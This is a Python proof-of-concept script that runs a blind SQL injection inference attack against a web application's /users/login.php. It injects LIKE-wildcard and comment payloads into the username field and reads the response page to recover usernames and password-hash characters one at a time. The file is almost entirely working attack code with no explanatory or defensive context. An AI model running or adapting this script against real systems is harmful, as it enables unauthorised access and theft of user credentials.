#!/usr/bin/python3

import requests, sys, threading, time, copy

login_url = "/users/login.php"

def reduce_search_space(character_space):
    login_data = {
        'username': '',
        'password' : ''
    }

    temp = copy.deepcopy(character_space)

    for c in temp:
        login_data['username'] = '%' + c + '%\' -- \#'

        if not sqli(login_data):
            character_space.remove(c)

def check_login(entry, brute_forcing_usernames):

    login_data = {
        'username': '',
        'password' : ''
    }

    if brute_forcing_usernames:
        login_data['username'] =  entry + '\' -- \#'
    else:
        login_data['username'] = '\' or password like \'' + entry+ '\' -- \#'
    return sqli(login_data)

def brute(character_space, brute_forcing_usernames):
    login_data = {
        'username': '',
        'password' : ''
    }

    current = ""

    space_size = len(character_space)
    print (space_size)
    possible_usernames = []
    cracked_users = []


    for c in character_space:
        if brute_forcing_usernames:
            login_data['username'] =  c + '%\'-- \#'
        else:
            login_data['username'] = '\' or password like \'' + c + '%\' -- \#'

        if sqli(login_data) :
            if check_login(c, brute_forcing_usernames):
                # if duplicate(c, )
                cracked_users.append(c)
                print('cracked',c)
            else:
                possible_usernames.append(c)

    print ( possible_usernames)

    for user in possible_usernames:
        done = False
        duplicate_flag = False

        progress = user
        while not done:
            for i,c in enumerate(character_space):

                if brute_forcing_usernames:
                    login_data['username'] =  progress + c + '%\'-- \#'
                else:
                    login_data['username'] = '\' or password like \'' + progress + c + '%\' -- \#'
                if sqli(login_data):
                    if check_login(progress + c, brute_forcing_usernames ):
                        duplicate_flag = True
                        cracked_users.append(progress + c)
                        print ("cracked ", progress + c)

                    if not duplicate_flag:
                        progress += c
                        print (progress)
                        break

                if (i == space_size-1):
                    done = True

def sqli(login_data):
    global ip
    global login_url
    resp = requests.post(ip + login_url, login_data)
    return resp.text[1971:1981] == "<h2>Hello "

def main():
    global login_url
    global ip
    if (len(sys.argv) < 2):
        print ("usage: ./poc.py [target ip/url] [file_to_upload]")
        sys.exit(0)

    print ("Proof of concept - Blind SQLi - Inference attack")
    # add asci art

    ip = sys.argv[1]
    begin = time.time()

    if not 'http' in ip:
        ip = "http://" + ip


    proxy = {'http' : "http://127.0.0.1:8080"}

    num_requests = 0
    not_done = True

    # + [x for x in range (63,91)]
    user_sample_space = [33, 35, 36, 64] + [x for x in range(49, 58)] + [x for x in range(97, 123)]
    username_character_space = list(map(lambda x: chr(x), user_sample_space))

    # to brute hashes, need to check
    pass_sample_space = [x for x in range(49, 58)] + [x for x in range(97, 103)]
    password_character_space = list(map(lambda x: chr(x), pass_sample_space))

    print (username_character_space)
    reduce_search_space(username_character_space)
    print (username_character_space)

    # TWO THREADS !!

    brute(username_character_space, True)
    print ("end", time.time() - begin)
    exit(0)

if __name__ == "__main__":
    main()
